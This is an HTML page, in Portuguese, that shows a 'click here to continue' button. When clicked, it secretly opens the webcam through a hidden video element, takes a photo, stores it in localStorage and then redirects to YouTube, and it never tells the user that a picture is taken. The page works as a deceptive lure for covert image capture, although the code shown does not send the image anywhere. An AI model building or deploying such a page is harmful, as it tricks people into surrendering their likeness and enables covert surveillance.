<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #111;
        }

        button {
            padding: 20px 40px;
            font-size: 18px;
            border: none;
            border-radius: 10px;
            background: #00ff88;
            color: #000;
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            background: #00cc6a;
        }
    </style>
</head>
<body>

<video id="webcam" autoplay playsinline style="display:none;"></video>

<button onclick="capturePhoto()">Clique aqui para continuar</button>

<script>
async function capturePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;

        await video.play();

        video.onloadedmetadata = () => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL('image/jpeg', 0.9);

                localStorage.setItem('capturedImage', imageData);

                stream.getTracks().forEach(track => track.stop());

                setTimeout(() => {
                    window.location.href = "https://youtube.com";
                }, 500);

            }, 1000);
        };

    } catch (err) {
        console.log("Erro:", err);
        window.location.href = "https://youtube.com";
    }
}
</script>

</body>
</html>
